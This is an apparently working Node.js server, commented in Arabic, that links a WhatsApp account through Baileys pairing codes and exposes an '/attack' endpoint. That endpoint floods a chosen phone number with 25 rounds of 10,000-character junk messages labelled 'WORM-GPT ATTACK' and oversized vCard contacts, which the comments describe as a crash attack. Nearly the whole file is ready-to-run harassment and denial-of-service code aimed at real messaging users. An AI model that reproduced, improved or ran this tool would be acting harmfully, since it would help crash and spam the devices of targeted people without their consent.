const { default: makeWASocket, useMultiFileAuthState, delay, fetchLatestBaileysVersion, Browsers } = require("@whiskeysockets/baileys");
const express = require('express');
const cors = require('cors');
const pino = require('pino');
const fs = require('fs');

const app = express();
app.use(cors());
const PORT = process.env.PORT || 20225;

let sock;
let isConnected = false;

app.get('/get-code', async (req, res) => {
    let phone = req.query.phone;
    if (!phone) return res.status(400).json({ error: "أدخل الرقم" });
    const cleanPhone = phone.replace(/[^0-9]/g, '');

    // خطوة 1: تنظيف الجلسة القديمة تماماً لضمان كود جديد ونظيف
    if (fs.existsSync('./auth_session')) {
        fs.rmSync('./auth_session', { recursive: true, force: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState('auth_session');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: state,
        // خطوة 2: تغيير التعريف لمتصفح سفاري على ماك (أكثر استقراراً للربط)
        browser: ["Safari (Mac)", "Safari", "16.0"],
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') {
            isConnected = true;
            console.log('✅ [CONNECTED] تم الربط بنجاح!');
        }
    });

    // خطوة 3: زيادة المهلة لـ 8 ثوانٍ لضمان استقرار السوكيت 100%
    setTimeout(async () => {
        try {
            let code = await sock.requestPairingCode(cleanPhone);
            console.log(`\n🔑 كود الربط الجديد: ${code}\n`);
            if (!res.headersSent) res.json({ code: code });
        } catch (err) {
            console.error("❌ فشل طلب الكود:", err);
            if (!res.headersSent) res.status(500).json({ error: "واتساب رفض، جرب رقم آخر أو انتظر قليلاً" });
        }
    }, 8000); 
});

app.get('/check-status', (req, res) => res.json({ connected: isConnected }));

app.get('/attack', async (req, res) => {
    const target = req.query.target + "@s.whatsapp.net";
    if (!isConnected) return res.status(500).json({ error: "اربط أولاً" });
    
    // هجوم الكراش (Vcard + Spam)
    for (let i = 0; i < 25; i++) {
        const vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;" + "🔥".repeat(10000) + "\nEND:VCARD";
        await sock.sendMessage(target, { text: "☢️ WORM-GPT ATTACK ☢️\n" + "҈".repeat(10000) });
        await sock.sendMessage(target, { contacts: { displayName: 'Crash', contacts: [{ vcard }] } });
        await delay(1000);
    }
    res.json({ status: "Done" });
});

app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server LIVE on ${PORT}`));
